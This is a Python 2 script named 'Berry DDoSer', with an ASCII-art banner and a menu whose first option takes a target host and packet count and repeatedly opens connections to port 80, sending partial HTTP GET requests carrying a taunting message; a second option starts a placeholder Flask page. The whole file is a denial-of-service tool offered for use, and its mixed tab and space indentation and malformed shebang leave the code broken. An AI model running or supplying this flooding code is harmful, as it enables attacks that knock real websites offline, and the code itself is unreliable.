#usr/bin/python
"""
"""
import time, socket, os, sys, string, random, subprocess
from flask import Flask
from colorama import *
init()


# useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
version = "0.0.1]"

subprocess.call('clear', shell=True)

def main():
	print(Fore.RED + "\t  ,/         \.  ")
	print("\t ((           )) ")
	print("\t  \`.       ,'   ")
	print("\t   )')     (`(	  ")
	print("\t ,'`/       \,`. ")
	print("\t(`-(         )-')")
	print("\t  \-')     (`-/  ")
	print("\t  /`'       `'\  ")
	print("\t (  _       _  ) ")
	print("\t | ( \     / ) | ")
	print("\t |  `.\   /,'  | ")
	print("\t |    `\ /'    | ")
	print("\t (             ) ")
	print("\t  \           /  ")
	print("\t   \         /   ")
	print("\t    `.     ,'    ")
	print("\t      `-.-'      ")
	print("\t             [v" + version)
	
        print "\nSelect option:"
        print
        print "\t [1] Berry DDoSer"
        print "\t [2] Start Webgui (Currently Still in Beta)"
	print "\n0) To Exit"
        print
        print

        choice = raw_input(Fore.BLUE + 'berry > ')
        print

        if choice == '1':
        	print ("[!] DDoS Mode Loaded")
        	host = raw_input('Host: ')
        	port = 80
        	conn = raw_input("How many packets: ")
        	message = "#strrrry is an eGod"
        	ip = socket.gethostbyname( host )

        	def dos():
        		ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        		try:
        			ddos.connect((host, 80))
        			ddos.send( "GET /%s HTTP/1.1\r\n" % message )
			        ddos.sendto( "GET /%s HTTP/1.1\r\n" % message, (ip, port) )
			        ddos.send( "GET /%s HTTP/1.1\r\n" % message )
        		except socket.error, msg:
        			print("[!] [Connection Failed]")
        		print("[DDoS Attack Serving on port: %s...]" % port)
        		ddos.close()
        	
        	for i in xrange(int(conn)):
        		dos()

        if choice == '2':
			app = Flask(__name__)

			@app.route("/")
			def web_start():
			    return '''
			    <html>
			    <head>
			    <style>
			    body{
			    background-color: black;
			    }
			    </style>
			    </head>
			    <body>
			    <center>
			    	<h1 style="color: red;">Berry DDoSer</h1>
			    	</center>
			    </body>
			    </html>
			    '''

			if __name__ == "__main__":
			    app.run()

        if choice == "exit" or choice == '0':
            raw_input("\t[!] Quiting Session...")
            print("\n[!] Session Closed.")
            exit()


if __name__ == '__main__':
		main()
		
	                                             